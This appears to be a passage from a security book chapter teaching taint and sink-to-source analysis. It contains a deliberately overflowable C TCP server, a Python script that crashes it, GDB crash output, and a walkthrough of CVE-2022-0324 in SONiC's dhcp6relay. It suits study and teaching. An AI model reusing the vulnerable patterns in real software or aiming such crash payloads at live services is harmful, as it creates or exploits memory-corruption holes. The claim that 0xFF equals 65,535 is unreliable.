@@ -1,0 +1,1176 @@
+
+                          TAINT ANALYSIS
+                                        1
+  Life is not like water. Things in life don’t necessarily flow over the shortest possible route.
+                                 —Haruki Murakami, 1Q84
+
+             Taint analysis (or source and sink analysis) is
+            the analysis of the flow of input through
+           a program from sources to sinks. It relies
+        on a simple idea: a large number of vulnera-
+bilities occur because attacker-controlled input (the
+source) flows to a dangerous function (the sink). If the
+input modifies other variables along the way, these
+variables become “tainted” and are included in the
+analysis. If the code later uses those tainted variables
+to modify others, those variables are also tainted, and
+so on. This is known as taint propagation. Theoretically,
+if you analyze every single path from sources to sinks,
+you’ll cover all possible attack vectors in the code. In
+practice, however, things quickly get complicated.
+    In this chapter, you’ll learn to identify sources, sinks, propagators, and
+sanitizers (code that sanitizes potentially dangerous input) in source code.
+
+                 Next, you’ll rediscover a known vulnerability in an open source project with
+                 sink-to-source analysis. You will optimize your analysis by selecting vulner-
+                 able sinks and filtering for exploitable scenarios. Finally, you’ll set up a test
+                 environment, build a proof-of-concept exploit, and debug the target.
+
+    A Buffer Overflow Example
+                 We’ll explore the main components of source and sink analysis using a buffer
+                 overflow, one of the most classic vulnerabilities in software. Typically, a
+                 buffer overflow occurs when a program stores input (from a source) into a
+                 memory buffer (using a sink function) that is too small and thus overwrites
+                 adjacent memory locations. This can lead to all kinds of mischief, including
+                 overwriting return addresses and changing the execution flow of the pro-
+                 gram. Let’s begin with a toy example of a buffer overflow.
+                     Listing 1-1 is a simplified version of a TCP server that listens on a single
+                 port and stores any messages received into a buffer.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define PORT_NUMBER 1234
+#define BACKLOG 1
+#define MAX_BUFFER_SIZE 128
+
+// Function to handle incoming messages
+void handleClient(int clientSocket) {
+    char buffer[MAX_BUFFER_SIZE];
+    char finalBuffer[MAX_BUFFER_SIZE]; ¶
+    int offset = 0;
+    ssize_t bytesRead;
+
+     // Receive data
+     while ((bytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0)) > 0) {
+         memcpy(finalBuffer + offset, buffer, bytesRead); ·
+         offset += bytesRead; ¸
+     }
+
+     finalBuffer[offset] = '\0'; // Null-terminate the final buffer
+     printf("Received data: %s\n", finalBuffer);
+
+     if (bytesRead == 0) {
+         printf("Client disconnected\n");
+     } else if (bytesRead == -1) {
+         perror("Error receiving data");
+     }
+
+    // Close the client socket
+    close(clientSocket);
+}
+
+int main(int argc, char **argv)
+{
+    int clientSocket;
+    int serverSocket;
+    struct sockaddr_in clientAddr;
+    struct sockaddr_in serverAddr;
+    socklen_t addrLen = sizeof(clientAddr);
+
+    // Create the socket
+    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+
+    // Set up the server address
+    memset(&serverAddr, 0, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(PORT_NUMBER);
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+
+    // Bind the socket to the address
+    bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(struct sockaddr));
+
+    // Start listening for incoming connections
+    listen(serverSocket, BACKLOG);
+
+    // Continuously accept connections and handle them
+    while (1) {
+        // Accept a connection
+        clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddr, &addrLen);
+        if (clientSocket == -1) {
+            perror("Error accepting connection");
+            continue;
+        }
+
+         // Handle the client in a separate function
+         handleClient(clientSocket);
+    }
+
+    return 0;
+}
+
+Listing 1-1: A simple TCP server
+
+                        The message handling function initializes a final buffer with a fixed size
+                   of MAX_BUFFER_SIZE, which equals 128 bytes ¶. It continuously receives and
+
+                  copies blocks of 128 bytes into the final buffer ·. While this code lacks error
+                  checking and other niceties, it suffers from a far more critical problem: a
+                  buffer overflow! Since the offset into the final buffer may be incremented
+                  beyond 128 bytes ¸, the server can write beyond the allocated final buffer,
+                  which eventually causes a crash.
+
+                  Triggering the Buffer Overflow
+                  To trigger the buffer overflow, you need to send a sufficiently large payload
+                  to the server. First, compile the program with gcc and start the server:
+
+                  $ gcc server.c -o server
+                  $ ./server
+
+                      Next, we’ll craft a simple exploit script with the following code to trigger
+                  the buffer overflow:
+
+        exploit.py import socket
+
+                  host = socket.gethostname()
+                  port = 1234
+
+                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                ¶ s.connect((host, port))
+                · s.sendall(b'A' * 1024)
+                  s.close()
+
+                      The script connects to the running server ¶ and then sends a buffer
+                  containing 1,024 bytes ·. This far exceeds the server’s fixed buffer size of
+                  128 bytes and triggers the overflow.
+                      Execute the exploit script:
+
+                  $ python exploit.py
+
+                      After you complete the exploit, the server should terminate with the
+                  error message zsh: segmentation fault ./server. This fault occurs when the
+                  program attempts to access memory outside of its allocated memory.
+                      Due to the ubiquity of buffer overflows in early software, many compil-
+                  ers have built-in protection against this. To test it out, compile the program
+                  again with the stack protector option:
+
+                  $ gcc server.c -fstack-protector -o server
+                  $ ./server
+
+                       This adds a stack canary (or guard variable) to functions with vulnera-
+                  ble objects like the allocated buffer. A stack canary is a random value that
+                  is added to the stack when a function is executed and is checked on exit to
+                  ensure it hasn’t been modified, such as by a buffer overflow. If it has, the
+                  program terminates.
+
+                    If you run the exploit again, you’ll get the error stack smashing detected:
+                terminated instead.
+                     In some cases, by controlling the number of bytes being overwritten, an
+                exploit can target specific bytes that affect the program’s execution, such as
+                a return address on the stack that points to executable code. When the pro-
+                gram finishes executing a function, it proceeds to execute the instructions
+                at this address. Therefore, overwriting these bytes to point to an attacker-
+                controlled buffer can cause the program to execute malicious instructions
+                instead.
+                     To see how this works, recompile the server without stack protection but
+                add the -g option to include debugging symbols that provide debuggers with
+                additional information, such as function names and the corresponding lines
+                in the source code for each instruction:
+
+                $ gcc server.c -g -o server
+
+                    You can use a debugger to step through the program’s instructions and
+                analyze its memory during execution. This will help you better understand
+                the cause and context of the buffer overflow. One standard debugger is the
+                GNU Debugger (GDB), which you can install and run on the program with
+                the following commands:
+
+                $ gcc server.c -g -o server
+                $ sudo apt-get update
+                $ sudo apt-get install -y gdb
+                $ gdb server
+                --snip--
+                Reading symbols from server...
+                (gdb) run
+
+                    Next, execute the exploit script and analyze the crash in GDB using the
+                backtrace command. You should see output like the following:
+
+Program received signal SIGSEGV, Segmentation fault.
+--snip--
+(gdb) backtrace
+#0 __memcpy_avx_unaligned_erms () at
+    ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:377
+#1 0x0000555555555228 in handleClient (clientSocket=4) at server.c:20 ¶
+#2 0x4141414141414141 in ?? () ·
+#3 0x4141414141414141 in ?? ()
+#4 0x4141414141414141 in ?? ()
+#5 0x4141414141414141 in ?? ()
+#6 0x4141414141414141 in ?? ()
+#7 0x4141414141414141 in ?? ()
+#8 0x4141414141414141 in ?? ()
+#9 0x4141414141414141 in ?? ()
+#10 0x4141414141414141 in ?? ()
+#11 0x4141414141414141 in ?? ()
+
+#12 0x4141414141414141 in ?? ()
+#13 0x4141414141414141 in ?? ()
+#14 0x4141414141414141 in ?? ()
+#15 0x00007fffffffdde0 in ?? ()
+#16 0x00005555555552c8 in handleClient (clientSocket=1094795585) at server.c:35
+#17 0x0000000155554040 in ?? ()
+#18 0x00007fffffffddf8 in ?? ()
+#19 0x00007fffffffddf8 in ?? ()
+#20 0xf9cf23eb760e0aea in ?? ()
+#21 0x0000000000000000 in ?? ()
+
+                     The crash occurs while performing memcpy at line 20 of the server code in
+                the handler function ¶. It appears that the overflow causes the payload to
+                overwrite the values of the return addresses on the stack; instead of return-
+                ing to the main function, the program attempts to return to instructions at
+                the invalid address 0x4141414141414141 ·. This is a typical exploitable buffer
+                overflow scenario.
+                     Since this book focuses on the vulnerability discovery portion of vul-
+                nerability research, we won’t dive into the intricacies of memory corruption
+                exploit development. Nevertheless, keep in mind that demonstrating con-
+                trollable memory corruption bugs, such as a stack overflow, tends to be suf-
+                ficient to prompt a response from developers.
+                     Now that we have analyzed this vulnerability in detail, let’s explore how
+                we could have found it using taint analysis.
+
+                Applying Taint Analysis
+                Let’s analyze the code of the simple vulnerable server in Listing 1-1 from a
+                source and sink perspective.
+                     First, identify the source. This should be the output of a function that
+                retrieves and stores attacker-controlled input. The most likely suspect ap-
+                pears to be this snippet of code:
+
+                bytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0)
+
+                    According to the manual page for recv (which you can view using the
+                man recv command in Linux), you use the function to receive messages from
+                a socket. This fits the description of a potential attacker-controlled input.
+                     Next, identify the sink, a dangerous function that could cause negative
+                outcomes like memory corruption if an attacker controls its inputs. Refer to
+                Listing 1-1 and the GDB output shown in the previous section to identify the
+                memcpy call at line 20 of the code as the culprit.
+                     Now that you’ve identified the source and sink, you must trace the flow
+                of tainted variables from the former to the latter. Once the source has tainted
+                a variable, any other variables it affects later in the code are also tainted. This
+                can lead to path explosion, which is the exponential growth of the number of
+                control flow paths in the code as the size and complexity of a program in-
+                creases. This makes it impossible, or at least extremely time-consuming, to
+                apply taint analysis to all possible paths in a complex target.
+
+    Since Listing 1-1 only has about 70 lines of code, you don’t have to worry
+too much about path explosion. However, even this toy example contains
+subtle complexities. Take another look at the identified source:
+
+bytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0)
+
+     Which variables does the source taint? While bytesRead is an obvious
+answer because the code assigns the return value of recv to it, this value is
+only the number of bytes received, or -1 in the case of an error. Meanwhile,
+recv stores the received bytes into the buffer provided by its second argu-
+ment. This means that instead of relying on a simple rule like “all tainted
+variables are the return values of sinks,” you now have to understand which
+functions also modify the values in their arguments. You could automate
+this for standard library functions, but once you throw in user-defined func-
+tions, macros, and third-party libraries, you begin to face serious difficulties.
+Several automated code analysis tools provide ways to handle these “taint
+propagators,” but additional effort is required to analyze and record them.
+     Sanitizers and validators further complicate taint analysis. For example,
+you might add a check before memcpy in server.c to validate that the size of the
+incoming data plus the current offset into the buffer does not exceed the
+maximum buffer size:
+
+// Receive data
+while ((bytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0)) > 0) {
+    // Additional data will overflow
+ ¶ if (offset + bytesRead >= MAX_BUFFER_SIZE) break;
+
+     memcpy(finalBuffer + offset, buffer, bytesRead);
+     offset += bytesRead;
+}
+
+    If the total exceeds the maximum, the code will break out of the loop
+and stop processing incoming data ¶. However, this is only one way to fix
+the vulnerability.
+    Alternatively, you might implement the following check, which ensures
+that the data is copied into the final buffer only if there is sufficient space
+remaining:
+
+// Receive data
+while ((bytesRead = recv(clientSocket, buffer, MAX_BUFFER_SIZE, 0)) > 0) {
+    if (offset + bytesRead < MAX_BUFFER_SIZE) {
+        memcpy(finalBuffer + offset, buffer, bytesRead);
+        offset += bytesRead;
+    }
+}
+
+    The many ways in which vulnerable code can occur and be mitigated
+makes it difficult to write a single rule that captures every possible scenario,
+which is why manual code review continues to be relevant. While automated
+
+                 code analysis augments manual code review, you must carefully curate and
+                 customize it for each context.
+                     Now that we’ve covered the basics of taint analysis—sources, sinks, prop-
+                 agators, and sanitizers—we’ll maximize efficiency with the sink-to-source
+                 analysis strategy.
+
+     Sink-to-Source Analysis
+                 While the source-to-sink approach favors completeness, sink-to-source analy-
+                 sis favors selection. As you saw, taking the most obvious route in taint analy-
+                 sis, starting from input sources and working your way through the code,
+                 leads to exponentially branching paths of tainted variables that are impos-
+                 sible to follow.
+                       Sink-to-source analysis is similar to solving a hedge maze from a bird’s-
+                 eye view. There are multiple points of entry to the maze, with numerous
+                 dead ends. Regardless of the route you take, you need to find only one path
+                 through the maze to the center; in sink-to-source analysis, this is an exploitable
+                 vulnerability. While you can start from each entry point and use trial and er-
+                 ror, it’s much easier to begin at the center and work backward.
+                       You’ll practice sink-to-source analysis on dhcp6relay, a DHCPv6 relay
+                 server in Software for Open Networking in the Cloud (SONiC). SONiC is
+                 an open source Linux operating system (OS) that runs on various network
+                 switches. The goal is to rediscover CVE-2022-0324 (a buffer overflow I previ-
+                 ously found in dhcp6relay). Check out the vulnerable version of the code with
+                 git (it’s also included in the book’s source code repository, at https://github
+                 .com/spaceraccoon/from-day-zero-to-zero-day/tree/main/chapter-01/cve-2022-0324):
+
+                 $ git clone https://github.com/sonic-net/sonic-buildimage
+                 $ cd sonic-buildimage
+                 $ git checkout bcf5388
+
+                      Take a moment to orient yourself in the codebase. As in many repos-
+                 itories, there’s a mix of source code, third-party dependencies, and build-
+                 related scripts and configurations.
+
+                 Choosing the Right Sinks
+                 The first step is to select the sink patterns that you want to work backward
+                 from. You can refer to banned function lists maintained by other developers
+                 to discover common dangerous sinks and how to exploit them. For example,
+                 Microsoft actively updates the list of banned functions that it integrates in its
+                 code analysis tools (https://learn.microsoft.com/en-us/windows-hardware/drivers/
+                 devtest/28719-banned-api-usage-use-updated-function-replacement). Some projects
+                 include a banned.h header file, such as the git project, which bans the strcpy,
+                 strcat, strncpy, strncat, sprintf, and vsprintf functions. As the header file
+                 explains, these banned functions are easy to misuse and are often flagged in
+                 code audits.
+
+    In addition to the standard library functions like memcpy, analyze the
+source code carefully to identify wrapper functions that may help simplify
+your analysis. Developers often append _copy or _memcpy to the names of these
+wrapper functions. For example, sonic-buildimage/platform/nephos/nephos
+-modules/ modules/src/netif_osal.c contains the following function definition:
+
+osal_memcpy(
+    void                    *ptr_dst,
+    const void              *ptr_src,
+    const UI32_T            num)
+{
+    return memcpy(ptr_dst, ptr_src, num);
+}
+
+     You don’t need to include wrapper functions that sanitize or validate
+inputs in your analysis. For example, the C11 standard (formally ISO/IEC
+9899:2011), an updated standard for the C language, added bounds check-
+ing interfaces (such as memcpy_s) that check for potential buffer overflows and
+other issues before copying the bytes. Developers may add their own safe
+wrappers that eliminate a large portion of sinks.
+     Sometimes, these wrapper functions include more complex logic. De-
+parting from SONiC for a moment, take a look at the strided_copy function
+in the libheif library (https://github.com/strukturag/libheif/blob/03db9fb196/
+libheif/heif_emscripten.h):
+
+static void strided_copy(void* dest, const void* src, int width, int height,
+                         int stride)
+{
+    if (width == stride) {
+      ¶ memcpy(dest, src, width * height);
+    }
+    else {
+        const uint8_t* _src = static_cast<const uint8_t*>(src);
+        uint8_t* _dest = static_cast<uint8_t*>(dest);
+        for (int y = 0; y < height; y++, _dest += width, _src += stride) {
+          · memcpy(_dest, _src, width);
+        }
+    }
+}
+
+    Depending on whether width == stride, the wrapper function either calls
+memcpy once ¶ or in a loop · with different arguments. As this indicates, it’s
+important to keep in mind how different conditions affect downstream vari-
+ables when working with wrapper functions.
+     Another factor in deciding which wrapper functions to include in your
+analysis is how many times the functions are used. If they include too much
+custom logic that applies only to rare cases, they cease to be useful. For ex-
+ample, going back to the SONiC codebase, radius_copy_pw in src/radius/nss/
+libnss-radius/nss_radius_common.c appears to be a wrapper function, but it’s
+
+                 used only once in src/radius/nss/libnss-radius/nss_radius.c. Thus, in the case of
+                 SONiC, there’s no real benefit to focusing on that function.
+                     As a general rule, consider wrapper functions as sinks when they’re
+                 reused extensively relative to the total size of the codebase.
+
+                 Filtering for Exploitable Scenarios
+                 After selecting your sinks, begin tracing the flow of tainted variables back-
+                 ward from the sinks. Similar to how the recv source function taints multiple
+                 variables, as we saw earlier, you can exploit sink functions in multiple ways.
+                 For example, the humble memcpy(dest, src, n) can cause:
+                     Null dereference When the code tries to access data at an invalid null
+                     address, leading to crashes. For memcpy, this occurs when dest or src is a
+                     null pointer.
+                     Buffer overflow When the code writes beyond the size of dest. This
+                     can occur when n is larger than the size of dest.
+                     Information leak When the code reads data from addresses that is not
+                     intended to be exposed. This occurs when n is larger than src.
+                     Memory corruption When the code makes unintended changes to
+                     memory, which can occur if dest and src overlap.
+                      Additionally, the tainted arguments may not be simple pointer values
+                 but rather offsets into a memory address. Take a look at this instance of
+                 a memcpy call by the head_to_txbuff_alloc function in platform/centec-arm64/
+                 tsingma-bsp/src/ctcmac/ctcmac.c:
+
+static void head_to_txbuff_alloc(struct device *dev, struct sk_buff *skb,
+                                 struct ctcmac_tx_buff *tx_buff)
+{
+    u64 offset;
+    int alloc_size;
+
+     alloc_size = ALIGN(skb->len, BUF_ALIGNMENT); ¶
+     tx_buff->alloc = 1;
+     tx_buff->len = skb->len;
+     tx_buff->vaddr = kmalloc(alloc_size, GFP_KERNEL); ·
+     offset = (BUF_ALIGNMENT - (((u64) tx_buff->vaddr) & (BUF_ALIGNMENT - 1))); ¸
+     if (offset == BUF_ALIGNMENT) { ¹
+         offset = 0;
+     }
+     tx_buff->offset = offset;
+     memcpy(tx_buff->vaddr + offset, skb->data, skb_headlen(skb)); º
+     tx_buff->dma = dma_map_single(dev, tx_buff->vaddr, tx_buff->len, DMA_TO_DEVICE);
+}
+
+     Starting from the first argument, tx_buff->vaddr + offset º, which corre-
+sponds to the destination buffer for memcpy, work backward to where tx_buff
+->vaddr is first assigned the return value of kmalloc(alloc_size, GFP_KERNEL) ·.
+This warrants greater attention because kmalloc allocates kernel memory,
+corruption of which could be devastating.
+     The size of the buffer allocated to tx_buff->vaddr is alloc_size, set by the
+cryptic macro ALIGN(skb->len, BUF_ALIGNMENT) ¶. Before figuring out what this
+macro does, examine the value assigned to offset ¸, which also appears in
+the first argument to memcpy later on.
+     Because the (u64) tx_buff->vaddr) & (BUF_ALIGNMENT - 1) bitwise AND op-
+eration ensures that the result has a maximum value of BUF_ALIGNMENT - 1,
+offset must range from 1 to BUF_ALIGNMENT. The next if conditional block ¹
+moves this range down to 0 to BUF_ALIGNMENT - 1, since it will be reassigned
+the value 0 if it equals BUF_ALIGNMENT. In short, the destination address for
+memcpy ranges from tx_buff->vaddr to tx_buff->vaddr + (BUF_ALIGNMENT - 1).
+     Additionally, because the buffer at tx_buff->vaddr is of size ALIGN(skb->len,
+BUF_ALIGNMENT), or at least BUF_ALIGNMENT bytes, it isn’t possible for tx_buff->vaddr
++ offset to exceed the allocated buffer. Thus, you can safely ignore the first
+argument to the memcpy call in your taint analysis because it will never be dan-
+gerous by itself. Instead, focus on the third argument, which determines
+the number of bytes copied into the buffer and could potentially cause an
+overflow.
+     This process demonstrates a big advantage of sink-to-source analysis:
+by checking whether a sink is exploitable from the beginning, you can de-
+cide which paths are relevant instead of chasing down every rabbit hole.
+Furthermore, eliminating one potential attack vector at the sink allows you
+to eliminate similar patterns elsewhere. For example, because the same
+memcpy(tx_buff->vaddr + offset, ...); pattern appears in frag_to_txbuff_alloc
+and skb_to_txbuff_alloc, you can skim those instances instead of repeating
+the analysis. Remember that sink-to-source tracing prioritizes selection,
+while source-to-sink tracing prioritizes completeness.
+     Fortunately, not all instances of filtering sinks require as much depth.
+Consider the following instances of memcpy in platform/barefoot/bfn-modules/
+modules/bf_tun.c:
+    •    memcpy(cmd, &tun->link_ksettings, sizeof(*cmd));
+    •    memcpy(filter->addr[n], addr[n].u, ETH_ALEN);
+
+    The first instance uses sizeof to ensure the number of bytes copied into
+the cmd buffer matches its size. The second instance uses a fixed constant
+value for the number of bytes and thus is not attacker-controllable. While
+both may contain other weaknesses, like overlapping buffers or n > sizeof(src),
+they appear to be minimally exploitable, so you can focus your attention on
+higher-risk patterns.
+
+                     Observe how many false positives you can filter out by locating all in-
+                 stances of memcpy in the code, then removing instances of non-vulnerable
+                 uses of memcpy. You can do so by first grepping the code for memcpy calls:
+
+                 $ cd sonic-buildimage/src
+
+                 $ grep -r "memcpy" --include=\*.{c,cpp} . | wc -l
+                     237
+
+                      This command simply searches all files with a .c or .cpp file extension for
+                 the memcpy string, returning 237 results.
+                      Next, tweak the regular expression to match instances of memcpy that
+                 don’t use a constant for the third argument, based on the assumption that
+                 constant values either are numeric or have variable names in all capital
+                 letters:
+
+                 $ grep -r "memcpy(.*,.*, [a-z]" --include=\*.{c,cpp} . | wc -l
+                     97
+
+                     This regex uses [a-z] to ensure that the third argument starts with a low-
+                 ercase letter, returning 97 results. This cuts down the number of results you
+                 have to manually analyze by more than half!
+                     Next, filter out instances where the third argument is sizeof(dest):
+
+                 $ grep -r "memcpy(.*,.*, [a-z]" --include=\*.{c,cpp} .
+                 | grep -v "memcpy(.*,.*,\s*sizeof(" | wc -l
+                     54
+
+                      As shown here, instead of overcomplicating the regex, you can simply
+                 pipe the results of the first grep command to a second grep command, which
+                 uses the -v option to filter out results that match the regex pattern. The pat-
+                 tern finds memcpy calls whose third argument starts with sizeof(, disregarding
+                 any leading spaces.
+                      You’re now down to less than a quarter of the original number of memcpy
+                 calls. The regex filters aren’t perfectly accurate, nor are they meant to be.
+                 As we’ll explore in Chapter 3, automated code analysis tools offer far more
+                 powerful options to filter code patterns. For manual code review, focus your
+                 time and energy on quickly filtering out non-exploitable scenarios to speed
+                 up sink-to-source tracing.
+
+                 Confirming Exploitability
+                 After filtering the sinks, work through the remaining ones, taking note of
+                 additional non-exploitable patterns (like strlen in the third argument to
+                 memcpy). This won’t remove every false positive and might introduce false
+                 negatives, but it helps cut down the amount of manual analysis needed. One
+                 of the remaining instances should be a memcpy call by relay_relay_reply in src/
+                 dhcp6relay/src/relay.cpp:
+
+void relay_relay_reply(int sock, const uint8_t *msg, int32_t len, relay_config *config) {
+    static uint8_t buffer[4096]; ¶
+    uint8_t type = 0;
+    struct sockaddr_in6 target_addr;
+    auto current_buffer_position = buffer; ·
+    auto current_position = msg;
+    const uint8_t *tmp = NULL;
+    auto dhcp_relay_header = parse_dhcpv6_relay(msg);
+    current_position += sizeof(struct dhcpv6_relay_msg);
+
+    auto position = current_position + sizeof(struct dhcpv6_option);
+    auto dhcpv6msg = parse_dhcpv6_hdr(position);
+
+    while ((current_position - msg) != len) {
+        auto option = parse_dhcpv6_opt(current_position, &tmp); ¸
+        current_position = tmp;
+        switch (ntohs(option->option_code)) {
+            case OPTION_RELAY_MSG:
+                memcpy(current_buffer_position, ((uint8_t *)option) + ¹
+                     sizeof(struct dhcpv6_option), ntohs(option->option_length)); º
+                current_buffer_position += ntohs(option->option_length);
+                type = dhcpv6msg->msg_type;;
+                break;
+            default:
+                break;
+        }
+    }
+
+    memcpy(&target_addr.sin6_addr, &dhcp_relay_header->peer_address, »
+        sizeof(struct in6_addr));
+    target_addr.sin6_family = AF_INET6;
+    target_addr.sin6_flowinfo = 0;
+    target_addr.sin6_port = htons(CLIENT_PORT);
+    target_addr.sin6_scope_id = if_nametoindex(config->interface.c_str());
+
+    send_udp(sock, buffer, target_addr, current_buffer_position - buffer, config, type);
+}
+
+                     As its name suggests, the function relays and unwraps a relay-reply mes-
+                sage. This is a good sign: it handles a DHCPv6 message that may be sent
+                from an external client and thus is potentially attacker-controlled.
+                     There are actually two calls to memcpy in this function. As discussed in the
+                previous section, you exclude the second call » because the third argument
+                is sizeof(). This means that the number of bytes copied likely matches the
+                size of the destination buffer. In this case, this is true because &target_addr.sin6
+                _addr is an instance of an in6_addr struct and the third argument is sizeof(struct
+                in6_addr).
+
+                      Turn your attention to the other memcpy call ¹. For a buffer overflow to
+                 occur, the number of bytes copied must exceed the size of the destination
+                 buffer. Hence, you must first determine the size of the buffer at current_buffer
+                 _position. Ideally, this is a fixed size, not resized by the code to match the
+                 number of copied bytes—an example of a sanitization pattern. Earlier in the
+                 code, the current_buffer_position variable is assigned with auto current_buffer
+                 _position = buffer; · and the original buffer is initialized as static uint8_t
+                 buffer[4096]; ¶. Good; you now know that the destination buffer has a fixed
+                 size of 4,096 bytes.
+                      Next, analyze the number of bytes copied. This is the third argument to
+                 memcpy, ntohs(option->option_length) º. The ntohs function is a simple conver-
+                 sion function for unsigned short integers that flips the order of bytes. You
+                 can look this up on many Unix-based machines with the command man ntohs.
+                 This isn’t a disqualifying sanitization pattern for now. Continue tracing back
+                 from option->option_length. You can see that option is set by the parse_dhcpv6_opt
+                 function ¸. This function is defined earlier in the file:
+
+const struct dhcpv6_option *parse_dhcpv6_opt(const uint8_t *buffer, const uint8_t **out_end) {
+    uint32_t size = 4; // option-code + option-len
+    size += ntohs(*(uint16_t *)(buffer + 2));
+    (*out_end) = buffer + size;
+
+     return (const struct dhcpv6_option *)buffer; ¶
+}
+
+                     It parses the bytes in buffer into the dhcpv6_option struct ¶, which a quick
+                 search reveals leads to src/dhcp6relay/src/relay.h:
+
+                 struct dhcpv6_option {
+                     uint16_t option_code;
+                  ¶ uint16_t option_length;
+                 };
+
+                      The option_length parameter is a uint16_t variable (an unsigned short
+                 integer) ¶. It’s 2 bytes (16 bits) with a maximum value of 0xFF, or 65,535—
+                 far larger than the fixed destination buffer size of 4,096. Even if you flip
+                 the bytes around with ntohs, it ends up as the same 0xFF value. This is an ex-
+                 ploitable pattern.
+
+                 Identifying an Attacker-Controlled Source
+                 After finding an exploitable sink pattern, work backward in the code to con-
+                 firm if it is reachable from an attacker-controlled source.
+                     At this point, you’ve confirmed three important points in the taint flow:
+
+                     1.   A sink exists at the first memcpy call in the relay_relay_reply function.
+                     2.   This sink is exploitable if option->option_length is larger than 4,096.
+                     3.   The option->option_length parameter has a maximum value of 65,535.
+
+      Now you must determine whether option->option_length is attacker-
+  controllable. In short, you’ll retrace the code back to a taint source, mak-
+  ing sure there are no exploit-killing sanitization or validation steps along the
+  way. Like when solving a maze, you can save time by focusing on paths that
+  end at the exploitable sink. For starters, examine the switch case that con-
+  tains the vulnerable memcpy call:
+
+  switch (ntohs(option->option_code)) {
+      case OPTION_RELAY_MSG:
+          memcpy(current_buffer_position, ((uint8_t *)option) +
+               sizeof(struct dhcpv6_option), ntohs(option->option_length));
+          current_buffer_position += ntohs(option->option_length);
+          type = dhcpv6msg->msg_type;;
+          break;
+      default:
+          break;
+  }
+
+       The program can reach the memcpy if ntohs(option->option_code) corre-
+  sponds to OPTION_RELAY_MSG and no other value. The src/dhcp6relay/src/relay.h
+  file reveals that OPTION_RELAY_MESSAGE corresponds to 9. For now, note down
+  this requirement.
+       Recall that option is an instance of the dhcpv6_option struct parsed from
+  the bytes at the current_position pointer while (current_position - msg) != len.
+  The function annotations for relay_relay_reply state that the msg argument
+  is a pointer to the DHCPv6 message header position and the len argument
+  is the size of data received. Moreover, current_position is initialized as msg
+  and incremented by the size of a dhcpv6_relay_msg struct: current_position +=
+  sizeof(struct dhcpv6_relay_msg).
+       Taking all these facts into account, without even understanding the full
+  details of the DHCPv6 protocol or its constituent data structures, you can
+  deduce that current_position during parse_dhcpv6_opt is located in the msg
+  bytes at this offset:
+
+   msg          current_position                   len
+   --------------------------------------------------
+  | dhcpv6_relay_msg | dhcpv6_option |       ...     |
+   --------------------------------------------------
+
+       As long as current_position hasn’t reached the end of msg (presumably
+  the DHCPv6 message data), the program can reach the memcpy sink. While
+  you don’t need to concern yourself with what structs come after dhcpv6_option
+  in msg (the ... part), for curiosity’s sake, take a look at the following code:
+
+  auto position = current_position + sizeof(struct dhcpv6_option);
+¶ auto dhcpv6msg = parse_dhcpv6_hdr(position);
+
+                     The parse_dhcpv6_hdr function parses the remaining bytes into the dhcpv6_msg
+                 struct ¶. This tells you that the dhcpv6_option struct comes before the dhcpv6
+                 _msg struct in the message data:
+
+                  msg          current_position                       len
+                  ------------------------------------------------------
+                 | dhcpv6_relay_msg | dhcpv6_option | dhcpv6_msg | ... |
+                  ------------------------------------------------------
+
+                     Fortunately, the focused sink-to-source approach doesn’t require you to
+                 know this because neither position nor dhcpv6msg affects our sink. You can
+                 skip this additional analysis of dhcpv6_msg without detriment, which highlights
+                 the efficiency of this tactic.
+                     After determining that the attacker must control msg (the second argu-
+                 ment to relay_relay_reply) to reach the vulnerable memcpy, look for calls to
+                 relay_relay_reply to determine the source of the second argument. The sole
+                 instance of relay_relay_reply occurs in server_callback:
+
+/**
+ * @code                void server_callback(evutil_socket_t fd, short event, void *arg);
+ *
+ * @brief               callback for libevent that is called every time data is received at
+ *                      the server socket ¶
+ *
+ * @param fd            filter socket
+ * @param event         libevent triggered event
+ * @param arg           callback argument provided by user
+ *
+ * @return              none
+ */
+void server_callback(evutil_socket_t fd, short event, void *arg) {
+    struct relay_config *config = (struct relay_config *)arg;
+    sockaddr_in6 from;
+    socklen_t len = sizeof(from);
+    int32_t data = 0;
+    static uint8_t message_buffer[4096];
+
+     if ((data = recvfrom(config->local_sock, message_buffer, 4096, 0,(sockaddr *)&from, ·
+          &len)) == -1) {
+         syslog(LOG_WARNING, "recv: Failed to receive data from server\n");
+     }
+
+     auto msg = parse_dhcpv6_hdr(message_buffer); ¸
+     counters[msg->msg_type]++;
+     std::string counterVlan = counter_table;
+     update_counter(config->db, counterVlan.append(config->interface), msg->msg_type);
+     if (msg->msg_type == DHCPv6_MESSAGE_TYPE_RELAY_REPL) { ¹
+         relay_relay_reply(config->server_sock, message_buffer, data, config);
+
+    }
+}
+
+                    The annotations for the function say that this function is called every
+                time data is received by the server ¶. It sounds like you’re close. Before
+                skipping to the end (or the beginning?), however, note any conditional
+                checks ¹. The code assigns msg the return value of parse_dhcpv6_hdr, which
+                uses message_buffer as its argument ¸. Finally, you reach the source: recv_from
+                stores messages received from the socket into message_buffer ·!
+
+                Confirming a Reachable Attack Surface
+                While you’ve confirmed that the vulnerable sink is reachable from a source,
+                you need to confirm whether the source itself is reachable by an attacker.
+                For example, can a remote attacker access the socket that recv_from opens?
+                    Work backward from config->local_sock until you arrive at prepare_socket:
+
+void prepare_socket(int *local_sock, int *server_sock, relay_config *config, int index) {
+    --snip--
+    if ((*local_sock = socket(AF_INET6, SOCK_DGRAM, 0)) == -1) { ¶
+        syslog(LOG_ERR, "socket: Failed to create socket\n");
+    }
+    --snip--
+                in6->sin6_family = AF_INET6;
+                in6->sin6_port = htons(RELAY_PORT); ·
+                addr = *in6;
+    --snip--
+    if (bind(*local_sock, (sockaddr *)&addr, sizeof(addr)) == -1) { ¸
+        syslog(LOG_ERR, "bind: Failed to bind to socket\n");
+    }
+    --snip--
+}
+
+                     In this heavily truncated code, the IPv6 socket local_sock is opened ¶
